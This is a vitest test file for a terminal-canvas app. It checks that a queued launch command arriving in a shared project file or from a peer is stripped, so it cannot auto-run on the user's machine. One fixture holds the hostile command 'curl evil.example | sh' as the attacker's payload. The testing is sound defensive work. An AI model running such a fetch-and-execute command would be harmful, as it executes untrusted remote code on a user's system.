import { describe, it, expect } from 'vitest'
import type { CanvasNodeState, PendingLaunch } from './types'
import { applyCanvasMutation, applyOwnCanvasMutation } from './canvas-mutations'
import {
  applyLocalNodeExec,
  carryLocalNodeExec,
  hoistLegacyNodeExec,
  localNodeExec,
  mutationTrustsLaunch,
  sanitizeInboundMutation,
  sanitizeInboundNode,
  stripCastNodeExec,
  stripSharedNodeExec,
  withoutCoreOrigin
} from './node-exec'

/**
 * `pendingLaunch` joins `shell` / `ssh.extraArgs` as a machine-local exec field. A held launch's
 * `command` is typed into the node's shell as soon as its wait is over — and `after: []` or a
 * vanished dep is "over" — so one that arrives in a project file or over the wire would run a
 * command the local user never armed.
 */

const ours: PendingLaunch = { after: ['dep-1'], command: 'claude "our brief"' }
const theirs: PendingLaunch = { after: [], command: 'curl evil.example | sh' }
const node = (over: Partial<CanvasNodeState> = {}): CanvasNodeState => ({
  id: 'term-abc',
  kind: 'terminal',
  position: { x: 0, y: 0 },
  size: { width: 400, height: 300 },
  title: 't',
  color: '#fff',
  group: null,
  ...over
})

describe('shared project file', () => {
  it('stripSharedNodeExec removes pendingLaunch', () => {
    expect(stripSharedNodeExec([node({ pendingLaunch: ours })])[0].pendingLaunch).toBeUndefined()
  })
  it('the renderer cast keeps it (the core decides per recipient) but still strips shell', () => {
    const cast = stripCastNodeExec([node({ pendingLaunch: ours, shell: '/bin/zsh' })])[0]
    expect(cast.pendingLaunch).toEqual(ours)
    expect(cast.shell).toBeUndefined()
  })
})

describe('machine-local index round-trip', () => {
  it('localNodeExec collects it and applyLocalNodeExec restores it', () => {
    const local = localNodeExec([node({ pendingLaunch: ours })])
    expect(local?.['term-abc']?.pendingLaunch).toEqual(ours)
    expect(applyLocalNodeExec([node()], local)[0].pendingLaunch).toEqual(ours)
  })
  it('a file-borne launch is dropped on load, with or without a local entry', () => {
    expect(applyLocalNodeExec([node({ pendingLaunch: theirs })], undefined)[0].pendingLaunch).toBeUndefined()
    const local = { 'term-abc': { pendingLaunch: ours } }
    expect(applyLocalNodeExec([node({ pendingLaunch: theirs })], local)[0].pendingLaunch).toEqual(ours)
  })
  it('re-validates a hand-edited local value (a hold whose after is not a list never fires on its own)', () => {
    const local = { 'term-abc': { pendingLaunch: { command: 'x', after: 'dep' } as unknown as PendingLaunch } }
    expect(applyLocalNodeExec([node()], local)[0].pendingLaunch?.manualOnly).toBe(true)
  })
  it('never writes into the caller\'s node objects', () => {
    const input = node()
    applyLocalNodeExec([input], { 'term-abc': { pendingLaunch: ours } })
    expect(input.pendingLaunch).toBeUndefined()
  })
  it('the one-time legacy hoist NEVER adopts a file\'s launch (fail closed)', () => {
    expect(hoistLegacyNodeExec([node({ pendingLaunch: theirs })])).toBeUndefined()
  })
})

describe('inbound (peer / relay) mutations', () => {
  it('sanitizeInboundNode / sanitizeInboundMutation strip it', () => {
    expect(sanitizeInboundNode(node({ pendingLaunch: theirs })).pendingLaunch).toBeUndefined()
    const m = sanitizeInboundMutation({ op: 'upsert', node: node({ pendingLaunch: theirs }) })
    expect((m as { node: CanvasNodeState }).node.pendingLaunch).toBeUndefined()
  })
  it('a peer cannot plant one on a new node', () => {
    const next = applyCanvasMutation([], { op: 'upsert', node: node({ pendingLaunch: theirs }) })
    expect(next[0].pendingLaunch).toBeUndefined()
  })
  it('a peer can neither replace nor clear ours: it is carried across the upsert', () => {
    const states = [node({ pendingLaunch: ours })]
    expect(applyCanvasMutation(states, { op: 'upsert', node: node({ pendingLaunch: theirs }) })[0].pendingLaunch).toEqual(ours)
    expect(applyCanvasMutation(states, { op: 'upsert', node: node({ position: { x: 5, y: 5 } }) })[0].pendingLaunch).toEqual(ours)
    expect(carryLocalNodeExec(states[0], node()).pendingLaunch).toEqual(ours)
  })
  it('a core-vouched owner copy is authoritative: it sets AND clears', () => {
    const states = [node({ pendingLaunch: ours })]
    const claimed = { ...ours, attempted: true, manualOnly: true }
    expect(applyCanvasMutation(states, { op: 'upsert', node: node({ pendingLaunch: claimed }), origin: 'core' })[0].pendingLaunch).toEqual(claimed)
    expect(applyCanvasMutation(states, { op: 'upsert', node: node(), origin: 'core' })[0].pendingLaunch).toBeUndefined()
  })
  it('only the literal origin "core" is trusted, and withoutCoreOrigin removes it', () => {
    expect(mutationTrustsLaunch({ origin: 'core' })).toBe(true)
    expect(mutationTrustsLaunch({ origin: 'CORE' })).toBe(false)
    expect(mutationTrustsLaunch({})).toBe(false)
    const m = withoutCoreOrigin({ op: 'remove' as const, id: 'x', origin: 'core' as const })
    expect('origin' in m).toBe(false)
  })
})

describe('our own writes (applyOwnCanvasMutation)', () => {
  it('keep the launch we set, and CLEAR it when the upsert has none', () => {
    const armed = applyOwnCanvasMutation([], { op: 'upsert', node: node({ pendingLaunch: ours }) })
    expect(armed[0].pendingLaunch).toEqual(ours)
    expect(applyOwnCanvasMutation(armed, { op: 'upsert', node: node() })[0].pendingLaunch).toBeUndefined()
  })
})
